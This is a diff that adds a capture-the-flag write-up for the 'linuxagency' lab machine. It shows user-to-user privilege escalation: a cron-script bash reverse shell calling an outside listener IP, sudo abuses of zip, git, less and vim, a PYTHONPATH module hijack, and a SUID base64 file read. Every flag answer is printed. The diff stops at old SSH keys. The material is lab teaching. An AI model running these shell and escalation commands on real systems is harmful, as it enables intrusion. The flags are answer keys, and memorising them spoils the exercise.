@@ -860,21 +860,426 @@ Date:   Mon Jan 11 15:36:40 2021 +0530
 
 # What is dalia's flag?
 
+First step is to check what command you are able to use as **viktor**
+```
+viktor@linuxagency:~$ pwd
+/home/viktor
+viktor@linuxagency:~$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+Password:
+Sorry, user viktor may not run sudo on linuxagency.
+```
+
+We cannot check this point by using **sudo -l**. We continue our investigation by checking the **crontab** to see if we don't have any interesting script running.
+
+```
+viktor@linuxagency:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *	* * *	dalia	sleep 30;/opt/scripts/47.sh
+*  *	* * *	root	echo "IyEvYmluL2Jhc2gKI2VjaG8gIkhlbGxvIDQ3IgpybSAtcmYgL2Rldi9zaG0vCiNlY2hvICJIZXJlIHRpbWUgaXMgYSBncmVhdCBtYXR0ZXIgb2YgZXNzZW5jZSIKcm0gLXJmIC90bXAvCg==" | base64 -d > /opt/scripts/47.sh;chown viktor:viktor /opt/scripts/47.sh;chmod +x /opt/scripts/47.sh;
+```
+
+We have permission to execute this script **47.sh**. This script is overwritten and  executed after **30 seconds**. 
+We can create a revershell ^^
+
+```
+viktor@linuxagency:~$ cat /opt/scripts/47.sh
+#!/bin/bash
+bash -i >& /dev/tcp/10.4.2.132/4242 0>&1
+```
+```
+nc -lnvp 4242
+Connection from 10.10.186.37:57456
+bash: cannot set terminal process group (2375): Inappropriate ioctl for device
+bash: no job control in this shell
+dalia@linuxagency:~$ ls -la
+ls -la
+total 36
+drwxr-x---  2 dalia dalia 4096 Jan 12  2021 .
+drwxr-xr-x 45 root  root  4096 Jan 12  2021 ..
+lrwxrwxrwx  1 dalia dalia    9 Jan 12  2021 .bash_history -> /dev/null
+-rw-r--r--  1 dalia dalia  220 Jan 12  2021 .bash_logout
+-rw-r--r--  1 dalia dalia 3771 Jan 12  2021 .bashrc
+-rw-r--r--  1 dalia dalia 8980 Jan 12  2021 examples.desktop
+-r--------  1 dalia dalia   40 Jan 12  2021 flag.txt
+-rw-r--r--  1 dalia dalia  807 Jan 12  2021 .profile
+dalia@linuxagency:~$ cat flag.txt
+cat flag.txt
+dalia{4a94a7a7bb4a819a63a33979926c77dc}
+```
+
+# Answer : dalia{4a94a7a7bb4a819a63a33979926c77dc}
+
 # What is silvio's flag?
+
+Now we need to upgrade our session to be able to work properly. For that, please follow the sequence : 
+```
+python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
+control+z to background
+stty raw -echo
+fg
+export TERM=xterm
+```
+
+Now, let's check **sudo -l**
+```
+dalia@linuxagency:~$ sudo -l
+sudo -l
+Matching Defaults entries for dalia on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dalia may run the following commands on linuxagency:
+    (silvio) NOPASSWD: /usr/bin/zip
+```
+
+Good news, we can execute **.usr/bin/zip**. Let's check [GTFOBINS](https://gtfobins.github.io/gtfobins/zip/#shell)
+```
+dalia@linuxagency:~$ TF=$(mktemp -u)
+TF=$(mktemp -u)
+dalia@linuxagency:~$ sudo -u silvio zip $TF /etc/hosts -T -TT 'bash #'
+sudo -u silvio zip $TF /etc/hosts -T -TT 'bash #'
+  adding: etc/hosts (deflated 37%)
+id
+uid=1032(silvio) gid=1032(silvio) groups=1032(silvio)
+cat /home/silvio/
+cat: /home/silvio/: Is a directory
+cd /home/silvio
+pwd
+/home/silvio
+ls -l
+total 16
+-rw-r--r-- 1 silvio silvio 8980 Jan 12  2021 examples.desktop
+-rw-r--r-- 1 silvio silvio   41 Jan 12  2021 flag.txt
+cat flag.txt
+silvio{657b4d058c03ab9988875bc937f9c2ef}
+
+```
+
+# Answer : silvio{657b4d058c03ab9988875bc937f9c2ef}
 
 # What is reza's flag?
 
+Same as usual, check **sudo -l**
+```
+silvio@linuxagency:~$ sudo -l
+sudo -l
+Matching Defaults entries for silvio on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User silvio may run the following commands on linuxagency:
+    (reza) SETENV: NOPASSWD: /usr/bin/git
+```
+
+Now we can execute **/usr/bin/git**.  Let's check [GTFOBINS](https://gtfobins.github.io/gtfobins/git/#shell). We canuse the first method.
+
+```
+sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
+sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
+$ whoami
+whoami
+reza
+$ pwd
+pwd
+/home/silvio
+$ cd /home/reza
+cd /home/reza
+$ ls -l
+ls -l
+total 16
+-rw-r--r-- 1 reza reza 8980 Jan 12  2021 examples.desktop
+-r-------- 1 reza reza   39 Jan 12  2021 flag.txt
+$ cat flag.txt
+cat flag.txt
+reza{2f1901644eda75306f3142d837b80d3e}
+```
+
+# Answer : reza{2f1901644eda75306f3142d837b80d3e}
+
 # What is jordan's flag?
+
+As usual :
+```
+reza@linuxagency:~$ sudo -l
+sudo -l
+Matching Defaults entries for reza on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User reza may run the following commands on linuxagency:
+    (jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py
+```
+
+Let's check this script
+```
+reza@linuxagency:~$ sudo -l
+sudo -l
+Matching Defaults entries for reza on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User reza may run the following commands on linuxagency:
+    (jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py
+reza@linuxagency:~$ cat /opt/scripts/Gun-Shop.py
+cat /opt/scripts/Gun-Shop.py
+cat: /opt/scripts/Gun-Shop.py: Permission denied
+reza@linuxagency:~$ sudo -u jordan /opt/scripts/Gun-Shop.py
+sudo -u jordan /opt/scripts/Gun-Shop.py
+Traceback (most recent call last):
+  File "/opt/scripts/Gun-Shop.py", line 2, in <module>
+    import shop
+ModuleNotFoundError: No module named 'shop'
+```
+
+Let's check the policy details by using **sudo -ll**
+```
+reza@linuxagency:~$ sudo -ll
+sudo -ll
+Matching Defaults entries for reza on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User reza may run the following commands on linuxagency:
+
+Sudoers entry:
+    RunAsUsers: jordan
+    Options: setenv, !authenticate
+    Commands:
+	/opt/scripts/Gun-Shop.py
+```
+**setenv** is available.
+```
+reza@linuxagency:~$ sudo -u jordan PYTHONPATH=/tmp/testshop/ /opt/scripts/Gun-Shop.py
+<rdan PYTHONPATH=/tmp/testshop/ /opt/scripts/Gun-Shop.py
+jordan@linuxagency:/home/reza$ whoami
+whoami
+jordan
+jordan@linuxagency:/home/reza$ cd /home/jordan
+cd /home/jordan
+jordan@linuxagency:~$ ls -l
+ls -l
+total 16
+-rw-r--r-- 1 jordan jordan 8980 Jan 12  2021 examples.desktop
+-rw------- 1 jordan jordan   41 Jan 12  2021 flag.txt
+jordan@linuxagency:~$ cat flag.txt
+cat flag.txt
+}3c3e9f8796493b98285b9c13c3b4cbcf{nadroj
+```
+
+Reverse
+```
+jordan@linuxagency:~$ cat flag.txt | rev
+cat flag.txt | rev
+jordan{fcbc4b3c31c9b58289b3946978f9e3c3}
+```
+
+# Answer : jordan{fcbc4b3c31c9b58289b3946978f9e3c3}
 
 # What is ken's flag?
 
+**sudo -l**
+
+```
+jordan@linuxagency:~$ sudo -l
+sudo -l
+Matching Defaults entries for jordan on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jordan may run the following commands on linuxagency:
+    (ken) NOPASSWD: /usr/bin/less
+```
+
+[GTFOBINS](https://gtfobins.github.io/gtfobins/less/#shell)
+
+```
+sudo -u ken less /etc/profile
+!/bin/bash
+!/bin/bash
+ken@linuxagency:/home/jordan$ whoami
+whoami
+ken
+ken@linuxagency:/home/jordan$ cd /home/ken
+cd /home/ken
+ken@linuxagency:~$ cat flag.txt
+cat flag.txt
+ken{4115bf456d1aaf012ed4550c418ba99f}
+```
+
+# Answer : ken{4115bf456d1aaf012ed4550c418ba99f}
+
 # What is sean's flag?
+
+**sudo -l**
+```
+ken@linuxagency:~$ sudo -l
+sudo -l
+Matching Defaults entries for ken on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User ken may run the following commands on linuxagency:
+    (sean) NOPASSWD: /usr/bin/vim
+```
+
+[GTFOBINS](https://gtfobins.github.io/gtfobins/vim/#shell)
+```
+ken@linuxagency:~$ sudo -u sean vim -c ':!/bin/bash'
+sudo -u sean vim -c ':!/bin/bash'
+
+E558: Terminal entry not found in terminfo
+'unknown' not known. Available builtin terminals are:
+    builtin_amiga
+    builtin_beos-ansi
+    builtin_ansi
+    builtin_pcansi
+    builtin_win32
+    builtin_vt320
+    builtin_vt52
+    builtin_xterm
+    builtin_iris-ansi
+    builtin_debug
+    builtin_dumb
+defaulting to 'ansi'
+
+:!/bin/bash
+sean@linuxagency:/home/ken$ whoami
+whoami
+sean
+```
+
+We don't find something in **sean** home
+```
+sean@linuxagency:~$ ls -la
+ls -la
+total 36
+drwxr-x---  2 sean sean 4096 Dec  5 17:23 .
+drwxr-xr-x 45 root root 4096 Jan 12  2021 ..
+lrwxrwxrwx  1 sean sean    9 Jan 12  2021 .bash_history -> /dev/null
+-rw-r--r--  1 sean sean  220 Jan 12  2021 .bash_logout
+-rw-r--r--  1 sean sean 3771 Jan 12  2021 .bashrc
+-rw-r--r--  1 sean sean 8980 Jan 12  2021 examples.desktop
+-rw-r--r--  1 sean sean  807 Jan 12  2021 .profile
+-rw-------  1 sean sean  582 Dec  5 17:23 .viminfo
+```
+We xcan try to find the flag by checking the file system
+```
+sean@linuxagency:~$ grep -rn "sean{" /var/log 2>/dev/null
+grep -rn "sean{" /var/log 2>/dev/null
+/var/log/syslog.bak:98675:Jan 12 02:58:58 ubuntu kernel: [    0.000000] ACPI: LAPIC_NMI (acpi_id[0x6d] high edge lint[0x1]) : sean{4c5685f4db7966a43cf8e95859801281} VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==
+```
+
+# Answer : sean{4c5685f4db7966a43cf8e95859801281}
 
 # What is penelope's flag?
 
+From the previous mission,  we catch something encoded in  base64.
+
+Let’s try to decode it
+```
+sean@linuxagency:~$ echo 'VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==' | base64 -d
+<JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==' | base64 -d
+The password of penelope is p3nelope
+```
+
+We can now SSH the targeted machine. Consider this step as your checkpoint ^^
+
+```
+penelope@linuxagency:~$ ls -l
+total 56
+-rwsr-sr-x 1 maya     maya     39096 Jan 12  2021 base64
+-rw-r--r-- 1 penelope penelope  8980 Jan 12  2021 examples.desktop
+-r-------- 1 penelope penelope    43 Jan 12  2021 flag.txt
+penelope@linuxagency:~$ cat flag.txt
+penelope{2da1c2e9d2bd0004556ae9e107c1d222}
+```
+
+# Answer : penelope{2da1c2e9d2bd0004556ae9e107c1d222}
+
 # What is maya's flag?
 
+Inside the **penelope** directory, we found an executable **base64**.
+
+Quick check in [GTFOBINS](https://gtfobins.github.io/gtfobins/base64/#file-read)
+```
+penelope@linuxagency:~$ LFILE=/home/maya/flag.txt
+penelope@linuxagency:~$ /home/penelope/base64 "$LFILE" | base64 -d
+maya{a66e159374b98f64f89f7c8d458ebb2b}
+```
+
+# Answer : maya{a66e159374b98f64f89f7c8d458ebb2b}
+
 # What is robert's Passphrase?
+
+Now we have access to **Maya** home. Many files, let's investigate ^^
+```
+maya@linuxagency:/home/penelope$ cd ..
+maya@linuxagency:/home$ cd maya/
+maya@linuxagency:~$ ls -la
+total 52
+drwxr-x---  5 maya maya 4096 Jan 15  2021 .
+drwxr-xr-x 45 root root 4096 Jan 12  2021 ..
+lrwxrwxrwx  1 maya maya    9 Jan 12  2021 .bash_history -> /dev/null
+-rw-r--r--  1 maya maya  220 Jan 12  2021 .bash_logout
+-rw-r--r--  1 maya maya 3771 Jan 12  2021 .bashrc
+drwxr-xr-x  3 maya maya 4096 Jan 12  2021 .local
+-rw-r--r--  1 maya maya  807 Jan 12  2021 .profile
+drwx------  2 maya maya 4096 Jan 12  2021 .ssh
+-rw-r--r--  1 maya maya  519 Jan 12  2021 elusive_targets.txt
+-rw-r--r--  1 maya maya 8980 Jan 12  2021 examples.desktop
+-r--------  1 maya maya   39 Jan 12  2021 flag.txt
+drwxr-xr-x  2 maya maya 4096 Jan 15  2021 old_robert_ssh
+```
+
+- First : **elusive_targets.txt**
+```
+maya@linuxagency:~$ cat elusive_targets.txt
+Welcome 47 glad you made this far.
+You have made our Agency very proud.
+
+But, we have a last unfinished job which is to infiltrate kronstadt industries.
+He has a entrypoint at localhost.
+
+Previously, Another agent tried to infiltrate kronstadt industries nearly 3 years back, But we failed.
+Robert is involved to be illegally hacking into our server's.
+
+He was able to transfer the .ssh folder from robert's home directory.
+
+The old .ssh is kept inside old_robert_ssh directory incase you need it.
+
+Good Luck!!!
+    47
+```
+
+Let's check **old_robert_ssh**
+```
+maya@linuxagency:~$ cd old_robert_ssh/
+maya@linuxagency:~/old_robert_ssh$ ls -l
+total 8
+-rw------- 1 maya maya 1766 Jan 12  2021 id_rsa
+-rw-r--r-- 1 maya maya  401 Jan 15  2021 id_rsa.pub
+```
 
 # What is user.txt?
 
